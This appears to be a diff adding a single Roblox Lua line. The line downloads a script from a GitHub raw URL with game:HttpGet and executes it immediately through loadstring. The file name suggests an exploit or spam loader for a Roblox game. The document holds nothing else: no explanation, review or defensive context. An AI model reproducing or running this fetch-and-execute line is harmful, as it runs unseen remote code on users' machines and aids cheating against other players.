@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/a-long-flight-early-access-spam0-op0571sgihedee.lua"))()
